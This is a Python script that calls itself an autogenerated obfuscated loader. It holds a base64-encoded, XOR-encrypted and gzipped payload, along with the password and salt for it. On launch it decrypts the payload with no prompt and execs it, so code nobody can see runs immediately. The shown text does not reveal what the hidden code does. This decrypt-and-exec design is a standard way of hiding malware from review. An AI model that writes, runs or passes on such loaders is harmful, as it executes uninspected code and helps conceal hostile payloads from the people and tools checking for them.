#!/usr/bin/env python3
# Autogenerated obfuscated loader (stdlib-only, password EMBEDDED â€” loader runs without any prompt)
import base64, gzip, types, sys, hashlib, traceback

nqpluiubhv = [
    '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'
]

yejcgtpm = {}
yejcgtpm['salt'] = bytes.fromhex('0269aba7d069bebd00a3e4eea402865e')
yejcgtpm['iterations'] = 300000

# The password/secret is embedded below: loader will NOT prompt for it.
awlvkcwi = 'u9Bf130FttweaR43NuJTHByfjW8'

def _derive(password, salt, iters=300000, dklen=32):
    return hashlib.pbkdf2_hmac('sha256', password, salt, iters, dklen)

def _xor_expand_and_decrypt(ct_bytes, key_bytes):
    key = key_bytes
    if len(key) < len(ct_bytes):
        out = bytearray(key)
        ctr = 1
        while len(out) < len(ct_bytes):
            out += hashlib.pbkdf2_hmac('sha256', key + ctr.to_bytes(2, 'big'), b'', 1, 32)
            ctr += 1
        key = bytes(out[:len(ct_bytes)])
    else:
        key = key[:len(ct_bytes)]
    return bytes([c ^ k for c, k in zip(ct_bytes, key)])

def main():
    try:
        B = ''.join(nqpluiubhv)
        ct = base64.b64decode(B)
        salt = yejcgtpm['salt']
        iterations = int(yejcgtpm['iterations'])
        # use embedded password directly
        pw = awlvkcwi.encode()
        key = _derive(pw, salt, iterations, dklen=32)
        pt = _xor_expand_and_decrypt(ct, key)
        src = gzip.decompress(pt).decode('utf-8', errors='replace')
        module = types.ModuleType('_obf_module')
        module.__file__ = '<embedded_obf>'
        exec(compile(src, module.__file__, 'exec'), module.__dict__)
        if hasattr(module, 'main'):
            try:
                sys.exit(module.main())
            except SystemExit:
                pass
        return 0
    except Exception as e:
        print('Error running obfuscated payload:', e)
        traceback.print_exc()
        return 1

if __name__ == '__main__':
    raise SystemExit(main())
